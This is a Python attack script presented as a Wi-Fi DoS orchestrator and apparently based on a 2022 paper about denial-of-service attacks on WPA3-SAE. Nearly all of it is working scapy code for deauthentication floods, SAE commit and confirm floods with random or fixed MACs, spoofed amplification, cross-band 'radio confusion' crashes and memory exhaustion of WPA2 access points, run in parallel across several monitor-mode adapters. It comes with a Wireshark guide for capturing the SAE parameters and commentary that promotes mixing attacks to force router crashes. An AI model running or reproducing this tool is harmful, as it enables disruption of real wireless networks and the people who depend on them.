#!/usr/bin/env python3
"""
================================================================================
Wi-Fi DoS Orchestrator
================================================================================
Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
Journal of Information Security and Applications (2022)

FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
================================================================================
"""

import subprocess
import time
import os
import sys
import csv
import glob
import random
from multiprocessing import Process, Value

# =====================================================================================
# ======================== CENTRAL CONFIGURATION ======================================
# =====================================================================================

# --- 1. TARGET DATA ---
TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:11"

# --- 2. SAE PARAMETERS (EXTRACTED VIA WIRESHARK) ---
# IMPORTANT: Enter DIFFERENT values for 2.4 GHz and 5 GHz!

# > Parameters for 2.4 GHz Network
SAE_SCALAR_2_4_HEX = 'INSERT_2_4_SCALAR_HERE'
SAE_FINITE_2_4_HEX = 'INSERT_2_4_FINITE_HERE'

# > Parameters for 5 GHz Network
SAE_SCALAR_5_HEX = 'INSERT_5_SCALAR_HERE'
SAE_FINITE_5_HEX = 'INSERT_5_FINITE_HERE'

# --- 3. OPTIONAL SCANNER ---
SCANNER_INTERFACE = "" # e.g. "wlan2mon" or ""

# --- 4. MANUAL CHANNEL ASSIGNMENT (Required without scanner) ---
MANUELLER_KANAL_5GHZ = "36"
MANUELLER_KANAL_2_4GHZ = "1"

# --- 5. TARGET CLIENTS (For targeted attacks like Deauth-Flood) ---
# Enter the real MAC addresses of connected devices here.
#
# IMPORTANT FOR RADIO CONFUSION ATTACK:
# The clients listed here must be visible on the band you are attacking FROM.
# - If you start the attack on 2.4 GHz (Adapter on Channel 1-13): 
#   -> Enter MAC addresses of clients currently connected to 2.4 GHz.
# - If you start the attack on 5 GHz (Adapter on Channel 36+):   
#   -> Enter MAC addresses of clients currently connected to 5 GHz.
TARGET_STA_MACS = [
    "AA:BB:CC:DD:EE:11",
    "AA:BB:CC:DD:EE:11"
]

# --- 6. AMPLIFICATION REFLECTORS ---
# Enter the BSSIDs of ALL APs here that should be used as "Reflectors" or "Amplifiers".
# The more APs listed here, the greater the channel saturation.
AMPLIFICATION_REFLECTOR_APS_5GHZ = [
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11",
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11"  
]
AMPLIFICATION_REFLECTOR_APS_2_4GHZ = [
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11"     
]
# ====================== ENCYCLOPEDIA OF ATTACKS ======================
#
# Here you will find a detailed explanation for each available attack type.
#
# --- Category: Client Direct Attacks ---
#
# "deauth_flood": Classic deauth attack for forcible disconnection.
#
# --- Category: WPA3-Specific Attacks (Modern) ---
#
# "omnivore": Strongest flooding attack with constantly changing MACs.
#     Effect: Floods the router with WPA3 connection attempts from ever-changing, random MAC addresses.
#             This forces the router to reserve memory (RAM) for each attempt until it is full.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3 (Very effective). WPA2 APs usually discard the packets without much load.
#
# "muted": Flooding attack with a single, static MAC.
#     Effect: Similar to "omnivore", but all attacks come from the same MAC address. This aims to
#             bypass specific defense mechanisms that only react to attacks from many sources.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "hasty": Confusion attack with Commit & Confirm packets.
#     Effect: Sends not only the first step of the WPA3 handshake (Commit) but also immediately the second (Confirm).
#             This aims to confuse the router's state machine and generate CPU load.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "double_decker": Combines "omnivore" & "muted" for maximum stress.
#     Effect: Described by the authors as "powerful". It attacks the router simultaneously
#             before and after its anti-DoS defense is activated. Maximum memory and CPU load.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "cookie_guzzler": Exploits the faulty re-transmission behavior of APs.
#     Effect: Sends SAE Commit frames in "bursts" from random MAC addresses to force the AP to
#             send a disproportionately large number of response frames, thereby overloading itself.
#     Suitable for: WPA3.
# --- Category: Universal & Vendor-Specific Attacks ---
#
# "open_auth": Classic DoS attack with Open Authentication requests.
#     Effect: A "Legacy" attack that floods the router with simple, old authentication requests.
#             According to studies, this is particularly effective at overloading the basic CPU queue.
#     Most effective band: 5 GHz (According to study, most effective here).
#     Suitable for: WPA2 and WPA3 (Universally effective). 5 GHz.
#
# "amplification": Spoofs sender MACs of legitimate devices.
#     Effect: The attacker sends packets to the target AP but spoofs the sender MAC address of another
#             device in the network. The target AP responds to the innocent device, clogging the channel.
#     Most effective band: 2.4 GHz (According to study, most effective here as this band is often more crowded).
#     Suitable for: WPA2 and WPA3 (Universally effective, as WPA2 devices also respond with error messages that clog the channel) 2.4 GHz Band.
#
# "radio_confusion": GENERIC Cross-Band Attack (Broadcom & MediaTek).
#     Effect: Sends SAE frames to the BSSID of the *opposite* band.
#     Mechanism: - If you start the attack on the 2.4 GHz band, the 5 GHz network is targeted/crashed.
#                - If you start the attack on the 5 GHz band, the 2.4 GHz network is targeted/crashed.
#     Why generic? This script automatically detects the adapter's band and targets the opposite one.
#                  It covers specific vendor vulnerabilities described in the paper:
#                  - Case 6 (Broadcom) & Case 13 Reverse (MediaTek) -> Attack from 2.4GHz to crash 5GHz.
#                  - Case 6 Reverse (Broadcom) & Case 13 (MediaTek) -> Attack from 5GHz to crash 2.4GHz.
#     Note: In the 'Master' script, these are split into specific cases. Here, one logic rules them all.
#
# "back_to_the_future": Overloads the memory of a WPA2 AP with WPA3 packets.
#     Effect: Exploits a bug in some WPA2 APs that react incorrectly to WPA3 packets. The attack floods
#             the WPA2 AP with these packets to fill its memory and cause it to crash.
#     Most effective band: Both bands (Universal, targets WPA2 APs).
#     Suitable for: WPA2 (Specifically targets WPA2 APs).
#
# ==============================================================================================
# --- CENTRAL ADAPTER & ATTACK CONFIGURATION ---
# Enter each attack adapter here with its target band and the desired attack.
ADAPTER_KONFIGURATION = {
    # --- 5 GHz Band ---
    # "wlan2mon": {"band": "5GHz", "angriff": "amplification"},
    
    # --- 2.4 GHz Band ---
    # "wlan1mon": {"band": "2.4GHz", "angriff": "amplification"},
    # "wlan3mon": {"band": "2.4GHz", "angriff": "omnivore"},
     "wlan4mon": {"band": "2.4GHz", "angriff": "double_decker"}
}
# ==============================================================================================
# ================= WHY MIXING ATTACKS IS SO EFFECTIVE (A "SYMPHONY OF CHAOS") =================
#
# The study shows that different attacks burden a router's resources in unique ways.
# By launching multiple, different attacks simultaneously, you create a multi-vector attack
# that is far more effective than an attack of a single type. The router not only has to deal
# with high volume but must handle multiple independent crises simultaneously.
#
# 1.  ATTACKING DIFFERENT RESOURCES:
#     - CPU OVERLOAD: Attacks like "open_auth" and "hasty" force the router to perform logic checks
#       and state management for every packet. This consumes massive amounts of CPU cycles
#       as it has to "think" about every invalid frame before discarding it.
#     - MEMORY EXHAUSTION: Attacks like "omnivore" and "double_decker" force the router
#       to allocate RAM to manage thousands of fake clients (MAC addresses).
#       This rapidly fills the router's RAM until it can no longer create new connections.
#
# 2.  BYPASSING DEFENSE MECHANISMS:
#     A defense mechanism designed for one attack type (like the Anti-Clogging "Cookie" system
#     against SAE floods) is completely ineffective against another attack type (like an old "open_auth" flood).
#     The router's specialized countermeasures are simply overwhelmed by the variety of attacks.
#
# 3.  CASCADING SYSTEM FAILURE:
#     By stressing CPU, memory, and protocol logic simultaneously, the router's operating system
#     is forced to "juggle" multiple critical errors at once.
#     This leads to resource starvation, freezing of processes, and ultimately a much faster
#     and almost guaranteed crash or system standstill than a single, monolithic attack could ever achieve.
#
# ==============================================================================================
# ================= GUIDE TO EXTRACTING SAE PARAMETERS WITH WIRESHARK =================
#
# 1.  PUT WIFI ADAPTER IN MONITOR MODE:
#     Ensure a WiFi adapter is in monitor mode to capture network traffic.
#     Example: `sudo airmon-ng start wlan0`
#
# 2.  START WIRESHARK AND CAPTURE TRAFFIC:
#     - Start Wireshark with sudo privileges: `sudo wireshark`
#     - Select the monitor interface (e.g., wlan0mon) and start capturing.
#
# 3.  PROVOKE A WPA3 HANDSHAKE:
#     - Connect a legitimate device (e.g., your phone) to the WPA3 target network. Use the WRONG password! Otherwise, the attack won't work!
#     - The first packets during the connection setup contain the SAE handshake.
#
# 4.  FILTER PACKETS IN WIRESHARK:
#     - Stop capturing after the connection attempt.
#     - To see only relevant packets, enter the following display filter:
#      wlan.fc.type_subtype == 0x0b
#
# 5.  FIND AND ANALYZE THE COMMIT PACKET:
#     - Look in the packet list for an "Authentication" frame.
#
# 6.  EXTRACT SCALAR AND FINITE ELEMENT:
#     - In the middle pane (Packet Details), navigate to:
#       -> IEEE 802.11 wireless LAN -> Tagged Parameters -> Tag: SAE -> ...
#
# 7.  COPY AND PASTE VALUES:
#     - Right-click on the "Scalar" field, select "Copy" -> "Value", and paste it into `SAE_SCALAR_HEX`.
#     - Repeat this for the "Finite Field Element" and paste it into `SAE_FINITE_ELEMENT_HEX`.
# ==============================================================================================
# ======================== ATTACK LOGIC ========================================================
# ==============================================================================================
def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex, finite_hex, counter, sta_macs=None, amplification_targets=None, opposite_bssid=None):
    from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp
    
    print(f"[INFO] Process {interface} ({attack_type}) started on CH {channel}.")
    
    # 1. CHANNEL SETTING
    try:
        subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        print(f"[ERROR] Channel switch failed for {interface}. Stopping.")
        return

    # 2. ROBUST HEX DECODING
    try:
        SAE_SCALAR_BYTES = bytes.fromhex(scalar_hex.strip())
        SAE_FINITE_BYTES = bytes.fromhex(finite_hex.strip())
    except (ValueError, TypeError) as e:
        print(f"\n[CRITICAL ERROR] Invalid Hex Params for {interface}: {e}", file=sys.stderr)
        return
    
    # Vorbereitung für Generic Attacks
    target_bssid_frame = opposite_bssid if attack_type == "radio_confusion" else bssid

    # 3. ATTACK LOOP
    try:
        while True:
            packet_list = []
            
            # --- A. Deauth Flood ---
            if attack_type == "deauth_flood":
                targets = (sta_macs or []) + ["ff:ff:ff:ff:ff:ff"]
                for sta in targets:
                    # Eine kleine Liste bauen
                    p = RadioTap()/Dot11(addr1=sta, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                    packet_list.extend([p] * 10)

            # --- B. Amplification ---
            elif attack_type == "amplification":
                if not amplification_targets or len(amplification_targets) < 2: 
                    time.sleep(5); continue
                src, dst = random.sample(amplification_targets, 2)
                pkt = RadioTap()/Dot11(type=0, subtype=11, addr1=dst, addr2=src, addr3=dst)/Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES
                packet_list = [pkt] * 50

            # --- C. Double Decker (Gemischt) ---
            elif attack_type == "double_decker":
                # Phase 1: 64x Random MACs (Echte Schleife nötig für Unique MACs!)
                for _ in range(64):
                    pkt_rand = RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES
                    packet_list.append(pkt_rand)
                
                # Phase 2: 64x Fixed MAC (Hier reicht Kopie)
                fixed_mac = sta_macs[0] if sta_macs else "00:11:22:33:44:55"
                pkt_fixed = RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=fixed_mac, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES
                packet_list.extend([pkt_fixed] * 64)

	    # --- Back to the Future (WPA2 Exploit) ---
            elif attack_type == "back_to_the_future":
                # Sende WPA3 SAE Frames an WPA2 AP (verursacht Speicherüberlauf)
                for _ in range(128):
                    mac_use = str(RandMAC())
                    # Wichtig: WPA2 APs verstehen SAE nicht -> Crash
                    pkt = RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=mac_use, addr3=bssid)/\
                          Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES
                    packet_list.append(pkt)
                    
            # --- D. Generic SAE (Omnivore, Muted, Radio Confusion, Cookie Guzzler) ---
            else:
                # Unterscheidung: Brauchen wir Random MACs (Omnivore) oder Static (Muted)?
                is_random_mac = (attack_type != "muted")
                
                # Burst Größe festlegen
                burst_size = 128
                
                if is_random_mac:
                    # WISSENSCHAFTLICHER FIX:
                    # Schleife generiert für JEDES Paket eine NEUE RandMAC()
                    for _ in range(burst_size):
                        mac_use = str(RandMAC())
                        base_pkt = RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, addr2=mac_use, addr3=target_bssid_frame)
                        
                        if attack_type == "open_auth":
                            auth = Dot11Auth(algo=0, seqnum=1, status=0)
                        else:
                            auth = Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES
                        
                        final = base_pkt/auth
                        packet_list.append(final)
                        
                        if attack_type == "hasty":
                            # Hasty braucht Commit + Confirm pro MAC
                            confirm = base_pkt/Dot11Auth(algo=3, seqnum=2, status=0)
                            packet_list.append(confirm)

                else:
                    # Muted Attacke (Immer gleiche MAC): Hier ist Listen-Multiplikation okay und schneller
                    mac_use = sta_macs[0] if sta_macs else "00:11:22:33:44:55"
                    base_pkt = RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, addr2=mac_use, addr3=target_bssid_frame)
                    pkt = base_pkt/(Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES)
                    packet_list = [pkt] * burst_size

            # --- SENDING (Burst Mode) ---
            if packet_list:
                try:
                    # Senden
                    sendp(packet_list, count=1, inter=0, iface=interface, verbose=0)
                    with counter.get_lock(): 
                        counter.value += len(packet_list)
                    
                    # FIX: Nur sehr kurz schlafen, wenn erfolgreich.
                    # Bei Omnivore wollen wir maximalen Druck.
                    time.sleep(0.01) 
                    
                except OSError:
                    # Buffer voll -> Länger warten
                    time.sleep(0.1)
                except Exception:
                    time.sleep(0.1)

    except KeyboardInterrupt: pass
    except Exception as e:
        print(f"\n[CRASH] Process {interface} died: {e}", file=sys.stderr)

def cleanup(procs):
    print("\n[INFO] Cleanup...")
    for p in procs.values():
        if p.is_alive(): p.terminate()

def main():
    if os.geteuid() != 0: sys.exit("Run as root.")
    
    print(f"[INFO] Starting Orchestrator with {len(ADAPTER_KONFIGURATION)} adapters.")
    
    procs = {}
    counters = {iface: Value('L', 0) for iface in ADAPTER_KONFIGURATION}

    try:
        while True:
            for interface, config in ADAPTER_KONFIGURATION.items():
                if interface not in procs or not procs[interface].is_alive():
                    
                    band = config['band']
                    attack = config['angriff']
                    
                    # 1. Logik: Welches Band greifen wir an (Parameter & Ziel-BSSID)?
                    if attack == "radio_confusion":
                        # Radio Confusion zielt immer auf das GEGENTEILIGE Band
                        target_band_logic = '5GHz' if band == '2.4GHz' else '2.4GHz'
                    else:
                        target_band_logic = band
                    
                    # 2. Parameter basierend auf ZIEL-Band setzen
                    if target_band_logic == '5GHz':
                        s_hex, f_hex = SAE_SCALAR_5_HEX, SAE_FINITE_5_HEX
                        target_bssid = TARGET_BSSID_5GHZ
                        # Opposite ist dann 2.4 (nur für Radio Confusion relevant)
                        opp_bssid = TARGET_BSSID_2_4GHZ 
                    else:
                        s_hex, f_hex = SAE_SCALAR_2_4_HEX, SAE_FINITE_2_4_HEX
                        target_bssid = TARGET_BSSID_2_4GHZ
                        opp_bssid = TARGET_BSSID_5GHZ

                    # 3. Physikalischer Kanal (Wo ist der Adapter?)
                    # Der Adapter muss IMMER auf dem Kanal sein, der in seiner Config steht ('band')
                    phy_channel = MANUELLER_KANAL_5GHZ if band == '5GHz' else MANUELLER_KANAL_2_4GHZ

                    args = (interface, target_bssid, phy_channel, attack, s_hex, f_hex, counters[interface])
                    kwargs = {'sta_macs': TARGET_STA_MACS, 
                              'amplification_targets': (AMPLIFICATION_REFLECTOR_APS_5GHZ if target_band_logic == '5GHz' else AMPLIFICATION_REFLECTOR_APS_2_4GHZ), 
                              'opposite_bssid': opp_bssid}
                    
                    p = Process(target=run_attacker_process, args=args, kwargs=kwargs)
                    procs[interface] = p
                    p.start()
            
            # Status Update
            status = [f"{iface}: {counters[iface].value}" for iface in ADAPTER_KONFIGURATION]
            sys.stdout.write(f"\r[RUNNING] {' | '.join(status)}   ")
            sys.stdout.flush()
            time.sleep(1)

    except KeyboardInterrupt:
        cleanup(procs)

if __name__ == "__main__":
    main()
